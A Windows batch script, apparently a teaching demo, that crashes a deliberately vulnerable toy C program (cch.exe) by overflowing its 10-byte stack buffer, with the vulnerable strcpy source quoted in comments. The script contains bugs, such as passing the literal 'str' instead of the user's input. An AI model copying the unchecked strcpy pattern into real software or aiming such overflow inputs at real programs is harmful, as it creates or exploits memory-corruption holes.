:: This is a VERY simple Batch exploit for cch.exe (Char Counter Hex)
:: Please keep in mind that cch.exe was written to be exploited
:: In the "real" world exploiting will never be this simple.
:: Stack Buffer Overflow
:: ----------------------------------------------------------------------
:: Here is the code in cch.c (which will be exploited)
:: ######################################################################### 
:: # #include <stdio.h>													   #
:: # #include <string.h>												   #								   
:: #																	   #
:: # void foobar (char *strtxt)											   #
:: # {																	   #																   
:: # char c[10];														   #			   
:: # strcpy(c, strtxt); 												   #
:: # 																	   #
:: # int i = 0;															   #
:: # while (i <= 10) {													   #
:: # printf("%c", c[i]); 												   #
:: # i++;																   #
:: # }																	   #
:: #																	   #
:: # }																   	   #
:: #																	   #
:: # int main(int argc, char *argv[])									   #
:: # {																	   #
:: #	foobar(argv[1]); // Send string data							   #
:: # }																	   #
:: ######################################################################### 

:: Now the actual exploit! (The goal is to make the program crash)

@echo off
color 0A
title CCH Exploitation

:: Start

:start 
echo What should be injected?
echo.
echo 1. Send safe data
echo 2. Crash program
echo 3. User Specs
echo 0. Quit
echo.

:: Get CHOICE

set /p choice=ARG: 

:: If segment

if %choice% == 1 cch HelloWorld
if %choice% == 2 cch ThisTextWillCrashTheProgramWhenSendWithTheFloat3.13251
if %choice% == 3 goto escalate
if %choice% == 0 exit 

:escalate
set /p str=Enter string: 
cch str
pause
